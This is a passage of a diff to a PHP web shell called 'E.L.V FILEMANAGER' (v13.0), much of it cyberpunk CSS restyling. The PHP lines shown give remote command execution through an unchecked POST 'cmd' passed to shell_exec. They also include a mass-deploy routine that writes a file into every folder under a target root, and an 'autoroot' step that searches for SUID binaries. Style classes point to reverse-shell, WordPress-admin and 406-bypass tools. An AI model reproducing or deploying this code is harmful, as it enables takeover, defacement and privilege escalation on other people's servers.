+            $path = $target_root . '/' . $folder; 
+            if ($folder != '.' && $folder != '..' && is_dir($path)) { 
+                if (@file_put_contents($path . '/' . $file_name, $content)) { 
+                    $count++; 
+                    $injected_targets[] = "[+] " . $folder . " -> " . $file_name; 
+                } 
+            } 
+        } 
+        $status_msg = "SUCCESS: $count SECTORS INJECTED"; 
+        if ($count > 0) { 
+            $result_text = implode("\n", $injected_targets); 
+            $status_msg .= "<br><br><b style='color:var(--neon-pink);'>[ RESULT MASS DEPLOY ]</b><br>"; 
+            $status_msg .= "<textarea style='width:100%; height:200px; margin-top:10px; background:rgba(255,255,255,0.03); border:1px solid var(--neon-purple); color:var(--text-primary); font-family:monospace; padding:10px; resize:vertical;' readonly>" . htmlspecialchars($result_text) . "</textarea>"; 
+        } 
+    } else { 
+        $status_msg = "ERROR: TARGET ROOT NOT FOUND!"; 
+    } 
 }
 
 $u_info = @get_current_user();
@@ -442,10 +556,8 @@ $php_v = phpversion();
 $kernel = php_uname('r');
 $uuid_raw = @file_get_contents('/etc/machine-id');
 $uuid = $uuid_raw ? substr(trim($uuid_raw), 0, 18).'...' : 'LOCKED';
-
 $dis_func_raw = @ini_get('disable_functions');
 $dis_func = $dis_func_raw ? $dis_func_raw : 'NONE (BYPASSED)';
-
 $out = "";
 if (isset($_GET['autoroot']) && $_GET['autoroot'] == 'exec') {
     $out = "[[ E.L.V AUTOMATED ROOT ENGINE v1.0 ]]\n";
@@ -453,10 +565,9 @@ if (isset($_GET['autoroot']) && $_GET['autoroot'] == 'exec') {
     $suids = shell_exec("find / -perm -4000 -type f 2>/dev/null | head -n 10");
     $out .= $suids ? $suids : "[-] No SUID found.\n";
 }
-
-if (isset($_POST['cmd'])) { 
+if (isset($_POST['cmd'])) {
     @chdir($dir);
-    $out = @shell_exec($_POST['cmd']." 2>&1"); 
+    $out = @shell_exec($_POST['cmd']." 2>&1");
 }
 
 function formatSize($bytes) {
@@ -470,1033 +581,735 @@ function formatSize($bytes) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NONAME@E.L.V | FILEMANAGER v12.1 CYBERPUNK DARK</title>
+    <title>HxN | E.L.V FILEMANAGER v13.0 // CYBERPUNK METROCITY</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/theme/dracula.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
-        /* ================================================================ */
-/*  SWAY CYBERPUNK NEON — r/unixporn EDITION                       */
-/*  Author : NONAME@E.L.V                                          */
-/*  Style  : Hyper Dark + Neon Glitch + Disco Navigation           */
-/* ================================================================ */
-
-@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono:wght@400;700&display=swap');
-
-:root {
-    /* Core Backgrounds */
-    --bg-deep:        #0b0b10;
-    --bg-surface:     #111118;
-    --bg-card:        #16161f;
-    --bg-hover:       #1c1c2a;
-    
-    /* Neon Palette — Sway Cyberpunk */
-    --neon-cyan:      #00f0ff;
-    --neon-magenta:   #ff00aa;
-    --neon-yellow:    #ffea00;
-    --neon-green:     #00ff88;
-    --neon-red:       #ff003c;
-    --neon-orange:    #ff6600;
-    --neon-blue:      #3366ff;
-    --neon-purple:    #aa00ff;
-    
-    /* Text */
-    --text-primary:   #e0e0ff;
-    --text-secondary: #8888bb;
-    --text-dim:       #55557a;
-    
-    /* Borders */
-    --border-subtle:  #1e1e35;
-    --border-neon:    #00f0ff;
-    
-    /* Glow intensities */
-    --glow-cyan:      0 0 12px rgba(0, 240, 255, 0.4);
-    --glow-magenta:   0 0 12px rgba(255, 0, 170, 0.4);
-    --glow-yellow:    0 0 12px rgba(255, 234, 0, 0.4);
-}
-
-* { box-sizing: border-box; }
-
-html, body {
-    overflow-x: hidden;
-    width: 100%;
-    max-width: 100vw;
-}
-
-body {
-    background: var(--bg-deep);
-    color: var(--text-primary);
-    font-family: 'Share Tech Mono', 'Courier New', monospace;
-    margin: 0;
-    padding: 16px;
-    font-size: 14px;           /* ← Teks diperbesar */
-    line-height: 1.5;
-}
-
-/* CRT Scanline Overlay */
-body::after {
-    content: '';
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: repeating-linear-gradient(
-        0deg,
-        transparent,
-        transparent 2px,
-        rgba(0, 240, 255, 0.015) 2px,
-        rgba(0, 240, 255, 0.015) 4px
-    );
-    pointer-events: none;
-    z-index: 9999;
-}
-
-/* Subtle radial vignette */
-body::before {
-    content: '';
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background: radial-gradient(ellipse at 50% 30%, transparent 40%, rgba(0,0,0,0.7) 100%);
-    pointer-events: none;
-    z-index: 9998;
-}
-
-#terminal-bg {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw;
-    height: 100vh;
-    z-index: 0;
-    opacity: 0.07;
-}
-
-/* ================================================================ */
-/*  MAIN CONTAINER                                                  */
-/* ================================================================ */
-
-.container {
-    background: var(--bg-surface);
-    border: 1px solid var(--border-subtle);
-    padding: 24px;
-    box-shadow: 0 0 60px rgba(0,0,0,0.9), inset 0 0 80px rgba(0,0,0,0.4);
-    border-radius: 8px;
-    margin: 0 auto;
-    width: 100%;
-    max-width: 1440px;
-    position: relative;
-    z-index: 2;
-    backdrop-filter: blur(4px);
-}
-
-/* ================================================================ */
-/*  HEADER + BRAND                                                  */
-/* ================================================================ */
-
-.header {
-    display: flex;
-    align-items: center;
-    border-bottom: 1px solid var(--border-subtle);
-    padding-bottom: 18px;
-    margin-bottom: 18px;
-    justify-content: space-between;
-    flex-wrap: nowrap;
-}
-
-.header-brand {
-    display: flex;
-    align-items: center;
-    gap: 18px;
-}
-
-.logo {
-    width: 72px;
-    height: 72px;
-    border: 2px solid var(--neon-cyan);
-    border-radius: 50%;
-    box-shadow: var(--glow-cyan);
-}
-
-.brand pre {
-    color: var(--neon-cyan);
-    font-size: 6.5px;          /* ASCII lebih besar */
-    line-height: 1.2;
-    margin: 0;
-    font-weight: 700;
-    text-shadow: 0 0 10px var(--neon-cyan);
-}
-
-.brand small {
-    color: var(--text-secondary);
-    letter-spacing: 4px;
-    font-size: 13px;
-    text-transform: uppercase;
-    display: block;
-    margin-top: 8px;
-}
-
-/* Logout Button */
-.btn-logout-top {
-    background: transparent;
-    color: var(--neon-red);
-    text-decoration: none;
-    font-weight: 700;
-    padding: 12px 22px;
-    border-radius: 4px;
-    font-size: 14px;
-    border: 2px solid var(--neon-red);
-    box-shadow: 0 0 12px rgba(255,0,60,0.25);
-    white-space: nowrap;
-    transition: all 0.3s ease;
-}
-
-.btn-logout-top:hover {
-    background: rgba(255,0,60,0.12);
-    box-shadow: 0 0 30px var(--neon-red);
-    transform: scale(1.04);
-}
-
-/* ================================================================ */
-/*  HUD GRID — System Info                                         */
-/* ================================================================ */
-
-.hud-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-    gap: 12px;
-    background: rgba(0,0,0,0.4);
-    border: 1px solid var(--border-subtle);
-    padding: 18px;
-    border-radius: 6px;
-    margin-bottom: 18px;
-}
-
-.hud-item {
-    background: rgba(0,0,0,0.5);
-    padding: 12px;
-    border: 1px solid rgba(0,240,255,0.12);
-    border-radius: 4px;
-    text-align: center;
-    font-size: 13px;           /* Teks HUD diperbesar */
-    color: var(--text-secondary);
-    transition: border-color 0.3s;
-}
-
-.hud-item:hover {
-    border-color: var(--neon-cyan);
-    box-shadow: var(--glow-cyan);
-}
-
-.hud-item b {
-    color: var(--neon-cyan);
-    display: block;
-    margin-bottom: 6px;
-    font-size: 13px;
-    text-shadow: 0 0 6px var(--neon-cyan);
-    letter-spacing: 1px;
-}
-
-/* ================================================================ */
-/*  ALERT NOTIFICATION                                              */
-/* ================================================================ */
-
-.alert {
-    background: rgba(0,240,255,0.06);
-    border: 1px solid var(--neon-cyan);
-    color: var(--neon-cyan);
-    padding: 14px;
-    margin-bottom: 18px;
-    text-align: center;
-    border-radius: 4px;
-    font-size: 14px;           /* Alert diperbesar */
-    box-shadow: var(--glow-cyan);
-}
-
-/* ================================================================ */
-/*  NAVIGATION PANEL — DISCO JEDAG-JEDUG NEON                      */
-/* ================================================================ */
-
-.elv-neon-panel {
-    background: rgba(0,0,0,0.55);
-    border: 1px solid var(--border-subtle);
-    border-radius: 8px;
-    padding: 18px;
-    margin-bottom: 24px;
-    box-shadow: 0 0 30px rgba(0,0,0,0.8);
-    position: relative;
-    overflow: hidden;
-}
-
-/* Animated border glow — disco cycling */
-.elv-neon-panel::before {
-    content: '';
-    position: absolute;
-    top: -1px; left: -1px;
-    right: -1px; bottom: -1px;
-    border-radius: 8px;
-    background: linear-gradient(
-        45deg,
-        var(--neon-cyan),
-        var(--neon-magenta),
-        var(--neon-yellow),
-        var(--neon-green),
-        var(--neon-cyan)
-    );
-    background-size: 400% 400%;
-    z-index: -1;
-    animation: border-disco 4s linear infinite;
-    opacity: 0.5;
-}
-
-@keyframes border-disco {
-    0%   { background-position: 0% 50%; }
-    50%  { background-position: 100% 50%; }
-    100% { background-position: 0% 50%; }
-}
-
-.glass-top-icons {
-    display: flex;
-    justify-content: space-evenly;
-    align-items: center;
-    width: 100%;
-    gap: 12px;
-    flex-wrap: wrap;
-    position: relative;
-    z-index: 2;
-}
-
-/* Navigasi Icon Button — efek jedag-jedug */
-.glass-icon-btn {
-    color: var(--neon-cyan);
-    font-size: 48px;           /* Icon lebih besar */
-    text-decoration: none;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    transition: all 0.3s ease;
-    filter: drop-shadow(0 0 10px rgba(0,240,255,0.3));
-    animation: icon-glow-pulse 2s ease-in-out infinite;
-}
-
-.glass-icon-btn:nth-child(1) { animation-delay: 0s; }
-.glass-icon-btn:nth-child(2) { animation-delay: 0.66s; }
-.glass-icon-btn:nth-child(3) { animation-delay: 1.33s; }
-
-@keyframes icon-glow-pulse {
-    0%, 100% {
-        filter: drop-shadow(0 0 8px var(--neon-cyan));
-        color: var(--neon-cyan);
-    }
-    33% {
-        filter: drop-shadow(0 0 15px var(--neon-magenta));
-        color: var(--neon-magenta);
-    }
-    66% {
-        filter: drop-shadow(0 0 15px var(--neon-yellow));
-        color: var(--neon-yellow);
-    }
-}
-
-.glass-icon-btn:hover {
-    transform: scale(1.15);
-    animation: none;
-    filter: drop-shadow(0 0 25px var(--neon-cyan));
-    color: #fff !important;
-}
-
-.label-txt {
-    font-size: 12px;           /* Label diperbesar */
-    font-weight: 700;
-    margin-top: 8px;
-    color: var(--text-secondary);
-    letter-spacing: 1.5px;
-    text-transform: uppercase;
-}
-
-/* Tombol ASCII Engine — disco border cycling */
-.ascii-nav-btn {
-    text-decoration: none;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 12px 24px;
-    border: 2px solid var(--border-subtle);
-    background: rgba(0,0,0,0.5);
-    border-radius: 6px;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    position: relative;
-    animation: ascii-border-disco 3s linear infinite;
-}
-
-@keyframes ascii-border-disco {
-    0%   { border-color: var(--neon-cyan); box-shadow: 0 0 12px var(--neon-cyan); }
-    25%  { border-color: var(--neon-magenta); box-shadow: 0 0 12px var(--neon-magenta); }
-    50%  { border-color: var(--neon-yellow); box-shadow: 0 0 12px var(--neon-yellow); }
-    75%  { border-color: var(--neon-green); box-shadow: 0 0 12px var(--neon-green); }
-    100% { border-color: var(--neon-cyan); box-shadow: 0 0 12px var(--neon-cyan); }
-}
-
-.ascii-nav-btn:hover {
-    transform: scale(1.06);
-    background: rgba(0,0,0,0.7);
-    animation: none;
-    border-color: var(--neon-magenta) !important;
-    box-shadow: 0 0 30px var(--neon-magenta) !important;
-}
-
-.ascii-nav-btn pre {
-    margin: 0;
-    font-size: 5.5px;          /* ASCII lebih besar */
-    line-height: 1.15;
-    font-weight: 700;
-    color: var(--neon-cyan);
-    text-shadow: 0 0 6px var(--neon-cyan);
-}
-
-.ascii-nav-btn div {
-    font-size: 9px;
-    font-weight: 700;
-    letter-spacing: 3px;
-    margin-top: 6px;
-    color: var(--neon-magenta);
-    text-shadow: 0 0 6px var(--neon-magenta);
-}
-
-/* ================================================================ */
-/*  TOOLS INTERFACE                                                 */
-/* ================================================================ */
-
-.cyber-tools-interface {
-    background: rgba(0,0,0,0.5);
-    border: 1px solid var(--border-subtle);
-    border-radius: 8px;
-    padding: 24px;
-    margin-bottom: 24px;
-}
-
-.tools-title {
-    color: var(--neon-yellow);
-    text-align: center;
-    text-shadow: 0 0 12px var(--neon-yellow);
-    letter-spacing: 3px;
-    margin: 0 0 24px 0;
-    font-size: 18px;           /* Judul tools diperbesar */
-}
-
-.tools-grid-cyber {
-    display: grid;
-    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-    gap: 14px;
-}
-
-.cyber-tool-card {
-    background: rgba(0,0,0,0.4);
-    border: 1px solid var(--border-subtle);
-    border-radius: 6px;
-    padding: 18px;
-    text-decoration: none;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    text-align: center;
-    transition: all 0.3s ease;
-}
-
-.cyber-tool-card:hover {
-    border-color: var(--neon-cyan);
-    box-shadow: var(--glow-cyan);
-    transform: translateY(-3px);
-    background: rgba(0,240,255,0.06);
-}
-
-.icon-tool {
-    font-size: 28px;           /* Icon tools diperbesar */
-    margin-bottom: 12px;
-    color: var(--neon-cyan);
-    text-shadow: 0 0 10px var(--neon-cyan);
-}
-
-.tool-text-gold-wrap {
-    background: rgba(0,0,0,0.5);
-    border: 1px solid rgba(255,234,0,0.2);
-    width: 100%;
-    padding: 10px;
-    border-radius: 4px;
-}
-
-.tool-text-gold-wrap h3 {
-    margin: 0 0 6px 0;
-    font-size: 14px;           /* Judul tool card diperbesar */
-    color: var(--neon-yellow);
-    text-shadow: 0 0 6px var(--neon-yellow);
-    border-bottom: 1px solid rgba(255,234,0,0.2);
-    padding-bottom: 6px;
-}
-
-.tool-text-gold-wrap p {
-    margin: 0;
-    font-size: 12px;           /* Deskripsi tool lebih besar */
-    color: var(--text-secondary);
-}
-
-/* ================================================================ */
-/*  BREADCRUMB — Directory Path                                    */
-/* ================================================================ */
-
-.breadcrumb {
-    display: flex;
-    align-items: center;
-    background: rgba(0,0,0,0.4);
-    padding: 14px;
-    margin-bottom: 18px;
-    border-left: 4px solid var(--neon-cyan);
-    overflow-x: auto;
-    white-space: nowrap;
-    border-radius: 4px;
-    font-size: 15px;           /* Breadcrumb diperbesar */
-}
-
-.home-btn {
-    color: var(--neon-cyan);
-    margin-right: 12px;
-    font-size: 24px;
-    text-decoration: none;
-    text-shadow: 0 0 8px var(--neon-cyan);
-    transition: all 0.3s;
-}
-
-.home-btn:hover {
-    color: var(--neon-magenta);
-    text-shadow: 0 0 15px var(--neon-magenta);
-}
-
-.breadcrumb a {
-    color: var(--text-primary);
-    text-decoration: none;
-    font-weight: 700;
-    font-size: 15px;
-    transition: color 0.2s;
-}
-
-.breadcrumb a:hover {
-    color: var(--neon-cyan);
-    text-shadow: 0 0 8px var(--neon-cyan);
-}
-
-.breadcrumb span {
-    color: var(--text-dim);
-    margin: 0 10px;
-    font-size: 15px;
-}
-
-/* ================================================================ */
-/*  TOOLS ROW (Upload, MK File, MK Dir)                            */
-/* ================================================================ */
-
-.tools {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 12px;
-    margin-bottom: 18px;
-}
-
-.neon-cyan-box {
-    border: 1px solid var(--border-subtle);
-    background: rgba(0,0,0,0.3);
-    border-radius: 6px;
-    padding: 14px;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    transition: border-color 0.3s;
-}
-
-.neon-cyan-box:hover {
-    border-color: var(--neon-cyan);
-    box-shadow: var(--glow-cyan);
-}
-
-/* ================================================================ */
-/*  BUTTONS                                                         */
-/* ================================================================ */
-
-.btn-cyan-glow {
-    background: transparent;
-    border: 2px solid var(--neon-cyan);
-    color: var(--neon-cyan);
-    font-weight: 700;
-    box-shadow: 0 0 10px rgba(0,240,255,0.1);
-    text-shadow: 0 0 6px var(--neon-cyan);
-    transition: all 0.3s ease;
-    cursor: pointer;
-    border-radius: 4px;
-    font-family: inherit;
-    text-transform: uppercase;
-    font-size: 12px;           /* Tombol lebih besar */
-    padding: 12px 18px;
-}
-
-.btn-cyan-glow:hover {
-    background: rgba(0,240,255,0.1);
-    border-color: var(--neon-magenta);
-    box-shadow: 0 0 25px var(--neon-cyan), inset 0 0 12px rgba(0,240,255,0.08);
-    color: #fff;
-}
-
-.btn-gray {
-    background: transparent;
-    color: var(--text-secondary);
-    border: 1px solid var(--border-subtle);
-    font-weight: 700;
-    border-radius: 3px;
-    cursor: pointer;
-    padding: 6px 10px;
-    font-size: 11px;
-    font-family: inherit;
-    transition: all 0.2s;
-}
-
-.btn-gray:hover {
-    border-color: var(--neon-cyan);
-    color: var(--neon-cyan);
-}
-
-.btn-act-small {
-    background: transparent;
-    border: none;
-    color: var(--text-secondary);
-    cursor: pointer;
-    padding: 5px;
-    font-size: 15px;           /* Icon action lebih besar */
-    transition: 0.2s;
-    margin: 0 4px;
-}
-
-.btn-act-small:hover {
-    transform: scale(1.2);
-}
-
-.act-dl:hover { color: var(--neon-cyan); text-shadow: 0 0 10px var(--neon-cyan); }
-.act-cp:hover { color: var(--neon-green); text-shadow: 0 0 10px var(--neon-green); }
-.act-del:hover { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); }
-
-.btn-editor-save {
-    border: 2px solid var(--neon-green);
-    color: var(--neon-green);
-    background: transparent;
-    padding: 12px 24px;
-    font-weight: 700;
-    border-radius: 4px;
-    cursor: pointer;
-    font-family: inherit;
-    font-size: 14px;
-    text-transform: uppercase;
-    transition: all 0.3s;
-}
-
-.btn-editor-save:hover {
-    background: rgba(0,255,136,0.1);
-    box-shadow: 0 0 25px rgba(0,255,136,0.25);
-}
-
-.btn-editor-cancel {
-    border: 2px solid var(--neon-red);
-    color: var(--neon-red);
-    background: transparent;
-    padding: 12px 24px;
-    font-weight: 700;
-    border-radius: 4px;
-    cursor: pointer;
-    font-family: inherit;
-    font-size: 14px;
-    text-transform: uppercase;
-    transition: all 0.3s;
-    text-decoration: none;
-    text-align: center;
-}
-
-.btn-editor-cancel:hover {
-    background: rgba(255,0,60,0.1);
-    box-shadow: 0 0 25px rgba(255,0,60,0.25);
-}
-
-/* ================================================================ */
-/*  FORM INPUTS                                                     */
-/* ================================================================ */
-
-input[type="file"] {
-    background: rgba(0,0,0,0.4);
-    border: 1px dashed var(--border-subtle);
-    color: var(--text-primary);
-    padding: 8px;
-    width: 100%;
-    border-radius: 4px;
-    cursor: pointer;
-    font-family: inherit;
-    font-size: 12px;
-    outline: none;
-}
-
-input[type="file"]::file-selector-button {
-    background: rgba(0,0,0,0.6);
-    border: 1px solid var(--border-subtle);
-    color: var(--neon-cyan);
-    padding: 6px 10px;
-    border-radius: 3px;
-    margin-right: 8px;
-    cursor: pointer;
-    font-size: 11px;
-    transition: all 0.2s;
-}
-
-input[type="file"]::file-selector-button:hover {
-    border-color: var(--neon-cyan);
-}
-
-input[type="text"],
-input[type="number"],
-textarea,
-select {
-    background: rgba(0,0,0,0.5);
-    border: 1px solid var(--border-subtle);
-    color: var(--text-primary);
-    padding: 12px;             /* Input lebih besar */
-    width: 100%;
-    outline: none;
-    border-radius: 4px;
-    font-size: 14px;           /* Teks input lebih besar */
-    font-family: inherit;
-    transition: border-color 0.3s, box-shadow 0.3s;
-}
-
-input[type="text"]:focus,
-input[type="number"]:focus,
-textarea:focus,
-select:focus {
-    border-color: var(--neon-cyan);
-    box-shadow: 0 0 15px rgba(0,240,255,0.15);
-}
-
-/* CHMOD Input — Warna Hijau Gapunya Write Permission */
-input[name="c_perm"] {
-    background: transparent;
-    border: none;
-    color: var(--neon-red);    /* Default merah */
-    font-weight: 700;
-    font-size: 14px;
-    padding: 2px;
-    width: 45px;
-    text-align: center;
-}
-
-/* ================================================================ */
-/*  FILE TABLE — dengan pembeda WRITEABLE / NON-WRITEABLE          */
-/* ================================================================ */
-
-.table-responsive {
-    width: 100%;
-    overflow-x: auto;
-    background: rgba(0,0,0,0.3);
-    border: 1px solid var(--border-subtle);
-    border-radius: 5px;
-}
-
-table {
-    width: 100%;
-    border-collapse: collapse;
-    min-width: 650px;
-    font-size: 14px;           /* Teks tabel diperbesar */
-}
-
-th {
-    text-align: left;
-    background: rgba(0,0,0,0.7);
-    color: var(--neon-yellow);
-    padding: 14px 18px;
-    font-size: 13px;
-    text-transform: uppercase;
-    letter-spacing: 1.5px;
-    border-bottom: 2px solid var(--border-subtle);
-    font-weight: 700;
-    text-shadow: 0 0 6px var(--neon-yellow);
-}
-
-td {
-    padding: 12px 18px;
-    border-bottom: 1px solid rgba(255,255,255,0.03);
-    vertical-align: middle;
-    color: var(--text-primary);
-}
-
-/* ================================================================ */
-/*  ★★★ FILE LIST — WRITEABLE / NON-WRITEABLE HIJAU/MERAH ★★★     */
-/* ================================================================ */
-
-.item-t { 
-    text-decoration: none; 
-    font-weight: 700; 
-    font-size: 14px;           /* Nama file diperbesar */
-    transition: color 0.2s, text-shadow 0.2s;
-}
-
-/* Secara default pakai warna berdasarkan writeable — di-set inline dari PHP */
-.item-t[data-writable="1"] { 
-    color: var(--neon-green) !important; 
-    text-shadow: 0 0 8px rgba(0,255,136,0.4);
-}
-.item-t[data-writable="0"] { 
-    color: var(--neon-red) !important; 
-    text-shadow: 0 0 8px rgba(255,0,60,0.4);
-}
-
-.item-t:hover {
-    color: var(--neon-cyan) !important;
-    text-shadow: 0 0 12px var(--neon-cyan);
-}
-
-/* Label [D] dan [F] */
-.dir-label {
-    font-weight: 700;
-    margin-right: 6px;
-}
-
-.dir-label[data-type="dir"] { 
-    color: var(--neon-magenta); 
-    text-shadow: 0 0 6px var(--neon-magenta);
-}
-.dir-label[data-type="file"] { 
-    color: var(--neon-cyan); 
-    text-shadow: 0 0 6px var(--neon-cyan);
-}
-
-/* CHMOD color — hijau jika writable, merah jika tidak */
-.chmod-writable {
-    color: var(--neon-green) !important;
-    text-shadow: 0 0 6px var(--neon-green);
-}
-.chmod-nonwritable {
-    color: var(--neon-red) !important;
-    text-shadow: 0 0 6px var(--neon-red);
-}
-
-/* Size column */
-.col-size { 
-    width: 110px; 
-    color: var(--text-secondary); 
-    font-size: 13px;
-}
-.col-chmod { 
-    width: 100px; 
-    font-size: 13px;
-}
-.col-act { 
-    text-align: right; 
-    width: 200px; 
-    white-space: nowrap; 
-}
-
-/* ================================================================ */
-/*  CONSOLE / TERMINAL OUTPUT                                       */
-/* ================================================================ */
-
-.console {
-    background: rgba(0,0,0,0.7);
-    color: var(--neon-yellow);
-    padding: 18px;
-    border: 1px solid var(--border-subtle);
-    font-size: 14px;           /* Teks console diperbesar */
-    min-height: 140px;
-    overflow-y: auto;
-    margin-bottom: 12px;
-    border-top: 3px solid var(--neon-magenta);
-    white-space: pre-wrap;
-    border-radius: 4px;
-    font-family: inherit;
-    text-shadow: 0 0 5px var(--neon-yellow), 0 -1px 3px var(--neon-orange);
-}
-
-.console pre {
-    color: var(--neon-yellow);
-    margin: 0;
-    font-size: 14px;           /* Output console lebih besar */
-}
-
-/* Terminal Box (dedicated terminal mode) */
-.cyber-term-box {
-    background: rgba(0,0,0,0.5);
-    border: 1px solid var(--border-subtle);
-    border-radius: 6px;
-    padding: 24px;
-    display: flex;
-    flex-direction: column;
-}
-
-.cyber-input-wrapper {
-    display: flex;
-    align-items: center;
-    background: rgba(0,0,0,0.5);
-    border-left: 4px solid var(--neon-cyan);
-    padding: 16px;
-    margin-bottom: 16px;
-    transition: border-color 0.3s;
-}
-
-.cyber-input-wrapper:focus-within {
-    border-left-color: var(--neon-magenta);
-}
-
-.cyber-cmd-prompt {
-    color: var(--neon-cyan);
-    font-weight: 700;
-    margin-right: 16px;
-    text-shadow: 0 0 6px var(--neon-cyan);
-    font-size: 16px;
-    white-space: nowrap;
-}
-
-.cyber-cmd-input {
-    background: transparent !important;
-    border: none !important;
-    color: var(--text-primary) !important;
-    width: 100%;
-    font-family: inherit;
-    font-size: 16px !important;
-    outline: none;
-    padding: 0 !important;
-}
-
-.cyber-cmd-input::placeholder {
-    color: rgba(224, 224, 255, 0.2);
-}
-
-.cyber-exec-btn {
-    background: transparent;
-    border: 2px solid var(--neon-cyan);
-    color: var(--neon-cyan);
-    padding: 16px;
-    width: 100%;
-    font-family: inherit;
-    font-weight: 700;
-    font-size: 15px;
-    text-transform: uppercase;
-    letter-spacing: 4px;
-    cursor: pointer;
-    transition: all 0.3s;
-    text-shadow: 0 0 6px var(--neon-cyan);
-}
-
-.cyber-exec-btn:hover {
-    background: rgba(0,240,255,0.06);
-    color: #fff;
-    border-color: var(--neon-magenta);
-    box-shadow: 0 0 25px var(--neon-cyan);
-}
-
-/* ================================================================ */
-/*  CODEMIRROR EDITOR                                               */
-/* ================================================================ */
-
-.CodeMirror {
-    height: auto;
-    min-height: 500px;
-    font-size: 14px;           /* Code editor lebih besar */
-    border-radius: 4px;
-    border: 1px solid var(--border-subtle);
-    font-family: 'Share Tech Mono', monospace !important;
-}
-
-/* ================================================================ */
-/*  FOOTER                                                          */
-/* ================================================================ */
-
-.glow-static {
-    text-align: center;
-    margin-top: 36px;
-    padding-bottom: 24px;
-    color: var(--text-dim);
-    font-size: 12px;
-}
-
-/* ================================================================ */
-/*  TOOL CARD BORDER WARNA SPESIFIK                                 */
-/* ================================================================ */
-
-.card-autoroot { border-color: var(--neon-cyan) !important; }
-.card-recon { border-color: var(--neon-blue) !important; }
-.card-wpadmin { border-color: var(--neon-green) !important; }
-.card-revshell { border-color: var(--neon-red) !important; }
-.card-mass { border-color: var(--neon-magenta) !important; }
-.card-bypass406 { border-color: var(--neon-yellow) !important; }
-
-/* ================================================================ */
-/*  RESPONSIVE                                                      */
-/* ================================================================ */
-
-@media (max-width: 600px) {
-    .hud-grid { grid-template-columns: repeat(2, 1fr); }
-    .tools { grid-template-columns: 1fr; }
-    .brand pre { font-size: 3.5px; }
-    .container { padding: 12px; }
-    .header { flex-wrap: wrap; gap: 12px; }
-    .glass-icon-btn { font-size: 36px; }
-    .ascii-nav-btn { padding: 8px 14px; }
-    .ascii-nav-btn pre { font-size: 3.5px; }
-}
-
-@media (min-width: 768px) { 
-    .hud-grid { grid-template-columns: repeat(4, 1fr); } 
-    .tools { grid-template-columns: repeat(3, 1fr); } 
-}
-@media (min-width: 768px) { 
-    .hud-grid { grid-template-columns: repeat(4, 1fr); } 
-    .tools { grid-template-columns: repeat(3, 1fr); } 
-}?>
-</style>
+        :root { 
+            --neon-pink: #ff1493; 
+            --neon-pink-dim: #ff66b2;
+            --neon-cyan: #00e5ff; 
+            --neon-cyan-dim: #66f0ff;
+            --neon-purple: #8a2be2; 
+            --neon-purple-dim:#b066ff;
+            --neon-magenta: #ff00ff;
+            --neon-magenta-dim: #ff66ff;
+            --neon-yellow: #ffd700; 
+            --neon-yellow-dim:#ffe066;
+            --neon-green: #00ff88; 
+            --neon-green-dim:#66ffaa;
+            --neon-red: #ff0044; 
+            --neon-red-dim: #ff6688;
+            --neon-orange: #ff6600; 
+            --neon-orange-dim:#ff9944;
+            --bg-primary: #1a0533; 
+            --bg-secondary: #2d0a4a; 
+            --bg-surface: #4a1a7a; 
+            --bg-card: #2a1050; 
+            --bg-hover: #3a1860; 
+            --bg-input: #1a0533; 
+            --text-primary: #e0e0ff; 
+            --text-secondary: #b8b8d4;
+            --text-dim: #7a7a9a;
+            --steel: #b0c4de;
+            --border-subtle: #3a1a6a;
+            --border-active: #8a2be2;
+            --glow-pink:     0 0 8px rgba(255, 20, 147, 0.3);
+            --glow-cyan:     0 0 8px rgba(0, 229, 255, 0.3);
+            --glow-purple:   0 0 12px rgba(138, 43, 226, 0.4);
+            --glow-magenta:  0 0 12px rgba(255, 0, 255, 0.3);
+            --glow-yellow:   0 0 8px rgba(255, 215, 0, 0.2);
+            --glow-green:    0 0 8px rgba(0, 255, 136, 0.2);
+            --glow-red:      0 0 8px rgba(255, 0, 68, 0.2);
+        }
+        * { box-sizing: border-box; }
+        html, body { overflow-x: hidden; width: 100%; max-width: 100vw; }
+        body {
+            background: var(--bg-primary);
+            background-image: 
+                radial-gradient(ellipse at 20% 30%, rgba(138,43,226,0.25) 0%, transparent 60%), 
+                radial-gradient(ellipse at 80% 20%, rgba(75,0,130,0.2) 0%, transparent 60%), 
+                radial-gradient(ellipse at 50% 80%, rgba(0,0,255,0.15) 0%, transparent 50%);
+            color: var(--text-primary);
+            font-family: 'Share Tech Mono', 'Courier New', monospace;
+            margin: 0; padding: 16px; font-size: 14px; line-height: 1.5;
+        }
+        body::after {
+            content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(138,43,226,0.008) 2px, rgba(138,43,226,0.008) 4px);
+            pointer-events: none; z-index: 9999;
+        }
+        #terminal-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; opacity: 0.6; }
+        .scanline { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 9998; }
+        
+        /* ─── NEON DIVIDER LINES ─── */
+        .neon-divider {
+            height: 4px;
+            margin: 18px 0;
+            border-radius: 2px;
+            background: linear-gradient(90deg, var(--neon-cyan), var(--neon-purple), var(--neon-magenta), var(--neon-purple), var(--neon-cyan));
